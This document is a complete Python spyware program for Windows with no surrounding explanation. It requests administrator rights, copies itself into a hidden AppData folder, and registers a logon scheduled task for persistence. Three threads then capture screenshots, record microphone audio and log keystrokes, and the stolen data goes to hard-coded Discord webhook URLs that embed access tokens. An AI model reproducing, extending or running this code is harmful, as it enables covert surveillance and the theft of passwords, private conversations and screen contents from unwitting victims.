import pyautogui
from pynput import keyboard
import requests
import threading
import sounddevice as sd
import socket
from scipy.io.wavfile import write
import time
import os
import sys
import subprocess
import shutil
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

def copy():
    og_path = os.path.abspath(sys.argv[0])
    new_path = os.path.join(hidden_folder, "test.exe")
    try:
        if not os.path.exists(new_path) or not os.path.samefile(og_path, new_path):
            shutil.copy(og_path, new_path)
            print(f"Copied to: {new_path}")
    except Exception as e:
        print(f"File copy error: {e}")
    return new_path

text = ""
freq = 44100
duration_audio = 15
time_interval_screenshot = 3
time_interval_keystroke = 20
clear = True

webhook_audio = "https://discord.com/api/webhooks/1370707381490810930/u3rRQMXjgx_ifImsgpqqyVU1S5iZ_v0fcPuhPH_HiBW9fkTfVKw69JEzgP80XBnMivSG"
webhook_keylogger = "https://discord.com/api/webhooks/1370707610940080210/VhJxy6qbVyfAMESWJGPFUhv1WQJZMR2_fPTMWPjg7k2IGKQK0ZW06Vyy6tb86pp0UQGm"
webhook_screenshot = "https://discord.com/api/webhooks/1370707300892803162/ZRsc3YTvBpMF2mLytu95ZRpRGb8PCrvjhI4MSZ6yJh3LekMky4GRI3wRvMOS9OpaerfK"

def create_hidden_folder(app_name="MyApp"):
    appdata_path = os.getenv("APPDATA")
    folder_path = os.path.join(appdata_path, app_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path, exist_ok=True)

        subprocess.call(['attrib', '+h', folder_path])

        print(f"Hidden folder created at: {folder_path}")
    else:
        pass

    return folder_path

def scheduler(task_name, path):
    try:
        subprocess.run([
            "schtasks", "/create", "/tn", task_name,
            "/tr", f'"{path}"',
            "/sc", "onlogon",
            "/rl", "highest", "/f"
        ], check=True)
        print("[+] Scheduled task created.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to create scheduled task: {e}")


hidden_folder = create_hidden_folder("MyHiddenAppData")
new_path = copy()
screenshot_path = os.path.join(hidden_folder, "screenshot.png")
audio_path = os.path.join(hidden_folder, "audio.wav")
scheduler("MyHiddenApp", new_path)

def connected():
    try:
        socket.create_connection(('8.8.8.8', 53), timeout=3)
        return True
    except OSError:
        return False
    
def wait():
    while not connected():
        time.sleep(5)

def send_screen():
    while True:
        wait()
        try:
            pyautogui.screenshot(screenshot_path)
            with open(screenshot_path, 'rb') as f:
                response = requests.post(
                    webhook_screenshot,
                    files = {'file': ("screenshot.png", f, 'image/png')},
                    data = {'content': 'Here is the screenshot'}
                )
        except Exception as e:
            print(f"Error sending screenshot: {e}")
            
        print(f"Status Code For Screenshot: {response.status_code}")
        time.sleep(time_interval_screenshot)

def send_audio():
    while True:
        wait()
        try:
            recording = sd.rec(int(duration_audio * freq),
                        samplerate=freq, channels=2)
            sd.wait()
            write(audio_path, freq, recording)

            with open(audio_path, 'rb') as f:
                response = requests.post(
                    webhook_audio,
                    files = {'file': ('audio.wav', f, 'audio/wav')},
                    data = {'content': "Here is the audio file"}
                )
            print(f"Status Code For Audio: {response.status_code}")
        except Exception as e:
            print(f"Error sending audio: {e}")

        time.sleep(duration_audio)

def send_data():
    global text
    while True:
        wait()
        data = {
            "content": text,
            "title": "Key Logger"
        }
        requests.post(webhook_keylogger, json=data)
        if clear:
            text = ""
        time.sleep(time_interval_keystroke)

def on_press(key):
    global text
    if key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == (keyboard.Key.backspace):
        if len(text) > 0:
            text = text[:-1]
        else:
            pass
    elif key == keyboard.Key.esc:
        return False
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        text += str(key).strip("'")

def keys():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()



threading.Thread(target=send_screen, daemon=True).start()
threading.Thread(target=send_audio, daemon=True).start()
threading.Thread(target=send_data, daemon=True).start()
keylogger_thread = threading.Thread(target=keys)
keylogger_thread.start()
